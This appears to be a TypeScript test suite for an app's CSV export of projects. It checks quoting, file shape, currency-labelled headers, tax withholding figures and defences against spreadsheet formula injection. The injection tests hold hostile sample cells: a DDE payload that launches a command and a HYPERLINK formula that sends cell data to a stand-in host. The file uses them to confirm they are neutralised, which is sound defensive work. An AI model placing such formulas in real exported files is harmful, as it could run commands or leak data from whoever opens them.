/*
  CSV export tests.
  Run: npm run test:csv

  Two classes of failure matter here and only one of them is cosmetic.

  A quoting bug produces a file that opens with the columns shifted, which is
  annoying and obvious. A formula-injection bug produces a file that runs
  something when the user's accountant opens it, which is neither. Project
  names are user-controlled — anyone can name a project anything — so the
  export is treated as untrusted output.
*/

import {
  csvCell,
  csvFilename,
  projectsToCsv,
  PROJECT_CSV_HEADERS,
  projectCsvHeaders,
  toCsv,
  UTF8_BOM,
} from "@/lib/export/csv";
import type { Project } from "@/types/project";

let passed = 0;
let failed = 0;

function assert(name: string, condition: boolean, detail = "") {
  if (condition) {
    passed++;
    console.log(`  PASS  ${name}`);
  } else {
    failed++;
    console.log(`  FAIL  ${name}${detail ? "  —  " + detail : ""}`);
  }
}

function project(over: Partial<Project> = {}): Project {
  return {
    id: "p1",
    name: "Website Redesign",
    client: "TechSolutions",
    status: "invoice_sent",
    deadline: "2026-10-01",
    hoursLogged: 10,
    hourlyRate: 75,
    invoiceTotal: null,
    isPaid: false,
    paidAt: null,
    contractSignedOn: null,
    contractUrl: null,
    paymentUrl: null,
    clientTaxType: null,
    ...over,
  };
}

console.log("\nCSV EXPORT\n" + "─".repeat(64));

// --- Formula injection ----------------------------------------------------
// The one that matters. Each of these is a cell a spreadsheet would execute.
const dangerous = [
  ["equals", "=1+1"],
  ["plus", "+1+1"],
  ["minus", "-1+1"],
  ["at sign", "@SUM(A1:A9)"],
  ["tab", "\tSUM(A1)"],
  ["carriage return", "\rSUM(A1)"],
  ["the classic payload", `=cmd|' /c calc'!A0`],
  ["hyperlink exfiltration", `=HYPERLINK("http://evil.test?x="&A1,"click")`],
];
for (const [name, payload] of dangerous) {
  const cell = csvCell(payload);
  // The escaped cell may also be quoted; what matters is the apostrophe sits
  // before the dangerous character, so the spreadsheet reads it as text.
  const inert = cell.startsWith("'") || cell.startsWith(`"'`);
  assert(`neutralises ${name}`, inert, cell);
}

// A name that merely contains those characters is fine and must not be mangled.
assert("leaves an interior equals alone", csvCell("A=B") === "A=B");
assert("leaves an interior hyphen alone", csvCell("Re-design") === "Re-design");
assert("leaves a plain name alone", csvCell("Website Redesign") === "Website Redesign");

// --- Quoting --------------------------------------------------------------
assert("quotes a value containing a comma", csvCell("Acme, Inc") === '"Acme, Inc"');
assert('doubles an embedded quote', csvCell('He said "hi"') === '"He said ""hi"""');
assert(
  "quotes a value containing a newline",
  csvCell("line one\nline two") === '"line one\nline two"',
);
assert("empty for null", csvCell(null) === "");
assert("empty for undefined", csvCell(undefined) === "");
assert("numbers pass through unformatted", csvCell(1234.5) === "1234.5");

// --- File shape -----------------------------------------------------------
{
  const csv = toCsv(["A", "B"], [["1", "2"]]);
  assert("starts with a UTF-8 BOM so Excel reads accents", csv.startsWith(UTF8_BOM));
  assert("uses CRLF line endings", csv.includes("\r\n"));
  assert("ends with a newline", csv.endsWith("\r\n"));
}

// --- A real export --------------------------------------------------------
{
  const csv = projectsToCsv([
    project({ name: "Fixed job", invoiceTotal: 10000, clientTaxType: "persona_moral" }),
    project({ name: "Hourly job", clientTaxType: "persona_fisica" }),
  ]);
  const lines = csv.replace(UTF8_BOM, "").trim().split("\r\n");

  assert("one header row plus one row per project", lines.length === 3, String(lines.length));
  assert(
    "header count matches the declared columns",
    lines[0].split(",").length === PROJECT_CSV_HEADERS.length,
  );

  // The whole reason a contador wants this file: the withholding is already
  // worked out rather than left as a formula for someone else to get wrong.
  assert("carries the worked withholding", lines[1].includes("1066.67"), lines[1]);
  assert("carries the net received", lines[1].includes("9533.33"), lines[1]);

  // No withholding for a persona física, and the net equals the invoice.
  assert("persona física row withholds nothing", lines[2].includes(",0,0,0,"), lines[2]);

  assert("accented client names survive", projectsToCsv([project({ client: "Martínez y Asociados" })]).includes("Martínez"));
}

// --- The currency is named, because six of them render as a bare "$" ------
// Inside the app the symbol is unambiguous: the reader chose it. A
// spreadsheet handed to an accountant is the one place that stops being true.
{
  const headers = projectCsvHeaders("MXN");
  assert("money columns name the currency", headers.includes("Net received (MXN)"), headers.join("|"));
  assert("the hourly rate names it too", headers.includes("Hourly rate (MXN)"));
  assert("non-money columns are untouched", headers.includes("Project") && headers.includes("Client"));
  assert(
    "a different currency changes the headers",
    projectCsvHeaders("COP").includes("Net received (COP)"),
  );
  assert(
    "the export uses them",
    projectsToCsv([project()], "BRL").includes("Net received (BRL)"),
  );
}

// --- Empty is a file, not a crash ----------------------------------------
{
  const csv = projectsToCsv([]);
  const lines = csv.replace(UTF8_BOM, "").trim().split("\r\n");
  assert("no projects still produces a header row", lines.length === 1);
}

// --- Filename -------------------------------------------------------------
{
  const name = csvFilename(new Date("2026-09-24T18:30:00Z"));
  assert("filename carries the date", name === "freeflow-projects-2026-09-24.csv", name);
  assert("filename has no characters needing escaping", /^[a-z0-9.-]+$/.test(name), name);
}

console.log("─".repeat(64));
console.log(`  ${passed} passed, ${failed} failed\n`);
if (failed > 0) process.exit(1);
